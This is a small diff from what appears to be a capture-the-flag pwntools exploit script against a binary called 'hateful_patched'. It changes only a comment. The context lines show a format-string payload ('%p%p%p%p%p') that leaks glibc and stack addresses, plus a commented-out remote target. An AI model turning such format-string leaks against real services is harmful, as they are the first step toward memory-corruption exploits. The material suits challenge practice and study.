@@ -12,7 +12,7 @@ p = gdb.debug('./hateful_patched', '''
 
 # p = remote('52.59.124.14', 5020)
 
-# Stage 1: leak glibc base address and rbp value
+# Stage 1: leak glibc base address and rbp value with format string
 p.sendlineafter(b">> ", b'yay')
 p.sendlineafter(b">> ", b'%p%p%p%p%p')
 p.recvuntil(b"email provided: ")
